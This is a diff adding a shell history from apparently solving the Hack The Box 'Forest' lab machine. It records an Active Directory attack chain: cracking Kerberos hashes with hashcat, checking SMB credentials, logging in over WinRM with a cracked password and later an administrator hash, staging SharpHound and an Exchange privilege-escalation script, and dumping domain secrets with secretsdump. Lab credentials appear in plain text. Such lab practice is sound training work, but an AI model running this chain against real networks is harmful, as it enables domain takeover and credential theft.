@@ -1,0 +1,91 @@
+2073  cd ~/Downloads/HTB/VIP/Forest/
+ 2074  nano hashes
+ 2075  cat hashes 
+ 2076  hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt
+ 2077  hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
+ 2078  hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule > svc-alfrescopassword.txt
+ 2079  cat svc-alfrescopassword.txt 
+ 2080  hashcat --force -m 18200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
+ 2081  hashcat --show
+ 2082  hashcat --force -m 18200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --show
+ 2083  nano ~/.hashcat/hashcat.potfile
+ 2084  hashcat --force -m 18200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
+ 2085  hashcat -b -m 18200
+ 2086  hashcat -b --force -m 18200
+ 2087  nano ~/.hashcat/hashcat.potfile 
+ 2088  crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
+ 2089  crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
+ 2090  cd ~/../usr/share/doc/python3-impacket/examples/
+ 2091  cd ~/Downloads/HTB/VIP/Forest/
+ 2092  locate evil-winrm
+ 2093  cd ~/Downloads/tools/windows/evil-winrm/
+ 2094  ls
+ 2095  ./evil-winrm.rb -h
+ 2096  ./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
+ 2097  sudo gem install winrm winrm-fs stringio
+ 2098  ./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
+ 2099  cd Downloads/
+ 2100  openvpn rootsid.ovpn
+ 2101  discord --no-sandbox
+ 2102  ifconfig tun0
+ 2103  locate 20200323143026_BloodHound.zip
+ 2104  ls
+ 2105  cd ..
+ 2106  cd HTB/VIP/Forest/
+ 2107  ls
+ 2108  neo4jconsole
+ 2109  neo4j console
+ 2110  ls
+ 2111  cd ../BloodHound/Ingestors/
+ 2112  ls
+ 2113  python -m SimpleHTTPServer
+ 2114  nano SharpHound.
+ 2115  nano SharpHound.ps1 
+ 2116  cd ..
+ 2117  ls
+ 2118  cd BloodHound-linux-x64/
+ 2119  ./BloodHound 
+ 2120  ./BloodHound --no-sandbox
+ 2121  cd ..
+ 2122  cd Ingestors/
+ 2123  ls
+ 2124  python -m SimpleHTTPServer 
+ 2125  cd ..
+ 2126  ls
+ 2127  cd BloodHound-linux-x64/
+ 2128  ./BloodHound 
+ 2129  ./BloodHound  --no-sandbox
+ 2130  ifconfig tun0
+ 2131  cd ~/Downloads/HTB/VIP/Forest/
+ 2132  ls
+ 2133  cat rootsidlogs.txt
+ 2134  nano rootsidlogs.txt
+ 2135  history
+ 2136  ./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
+ 2137  cd Downloads/tools/windows/evil-winrm/
+ 2138  ls
+ 2139  ./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
+ 2140  ./evil-winrm.rb -u rootsid -p rootsidtest -i 10.10.10.161
+ 2141  ./evil-winrm.rb -u administrator -p 32693b11e6aa90eb43d32c72a07ceea6 -i 10.10.10.161
+ 2142  ./evil-winrm.rb -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i 10.10.10.161
+ 2143  cd ../../windows/
+ 2144  mkdir Exchange
+ 2145  cd Exchange/
+ 2146  nano exchangeprivesc.txt
+ 2147  nano exchange.ps1
+ 2148  cp exchange.ps1 ~/Downloads/HTB/VIP/Forest/exchange.ps1
+ 2149  cd /Downloads/HTB/VIP/Forest/
+ 2150  cd ~/Downloads/HTB/VIP/Forest/
+ 2151  ls
+ 2152  nano exchange.ps1 
+ 2153  python -m SimpleHTTPServer 
+ 2154  nano exchange.ps1 
+ 2155  nano serviceaccountlogs
+ 2156  python -m SimpleHTTPServer 
+ 2157  nano exchange.ps1 
+ 2158  cd ..
+ 2159  cd ~/../usr/share/doc/python3-impacket/examples/
+ 2160  ls
+ 2161  ./secretsdump.py "htb.local/rootsid:rootsidtest@10.10.10.161"
+ 2162  cd Downloads/
+ 2163  ls
